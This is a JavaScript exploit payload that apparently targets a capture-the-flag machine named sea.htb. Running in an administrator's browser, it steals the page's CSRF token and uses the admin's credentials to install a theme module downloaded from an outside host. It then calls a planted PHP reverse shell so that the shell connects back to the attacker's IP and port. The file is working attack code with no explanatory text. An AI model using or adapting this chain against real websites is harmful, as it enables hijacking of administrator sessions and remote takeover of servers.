
var url = "http://sea.htb/loginURL";

// Create a URL object to properly manipulate the URL
var parsedUrl = new URL(url);

// Remove the last part of the path
var urlWithoutLogBase = parsedUrl.origin + parsedUrl.pathname.split("/").slice(0, -1).join("/");

// Get the token value from the DOM
var token = document.querySelector('[name="token"]').value;

// Construct the URL for the module installation
var urlRev = urlWithoutLogBase + "/?installModule=http://10.10.14.101:8888/main.zip&directoryName=violet&type=themes&token=" + token;

var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();

xhr3.onload = function() {
  if (xhr3.status == 200) {
    // After the module is installed, trigger the reverse shell
    var xhr4 = new XMLHttpRequest();
    xhr4.withCredentials = true;
    xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
    xhr4.send();

    xhr4.onload = function() {
      if (xhr4.status == 200) {
        // If the reverse shell is accessible, trigger it with IP and port
        var ip = "10.10.14.101";
        var port = "7777";
        var xhr5 = new XMLHttpRequest();
        xhr5.withCredentials = true;
        xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
        xhr5.send();
      }
    };
  }
};
